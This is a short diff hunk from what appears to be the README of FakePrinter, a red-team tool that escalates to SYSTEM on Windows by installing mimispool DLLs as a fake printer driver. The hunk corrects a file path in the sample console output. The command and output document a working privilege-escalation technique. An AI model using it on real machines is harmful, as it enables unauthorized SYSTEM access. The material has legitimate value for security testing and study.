@@ -6,7 +6,7 @@ Discovered and demonstraited by the one and only [Benjamin Delpy](https://twitte
 ```
 C:\Users\Flangvik\Desktop>FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
 [<3] @Flangvik - TrustedSec
-[+] Copying C:\Windows\system32\mscms.dll to C:\Windows\system32\spool\drivers\6cfbaf26f4c64131896df8a522546e9c.dll
+[+] Copying C:\Windows\system32\mscms.dll to C:\Windows\system32\6cfbaf26f4c64131896df8a522546e9c.dll
 [+] Copying 64mimispool.dll to C:\Windows\system32\spool\drivers\x64\3\6cfbaf26f4c64131896df8a522546e9c.dll
 [+] Copying 32mimispool.dll to C:\Windows\system32\spool\drivers\W32X86\3\6cfbaf26f4c64131896df8a522546e9c.dll
 [+] Adding printer driver => Generic / Text Only!
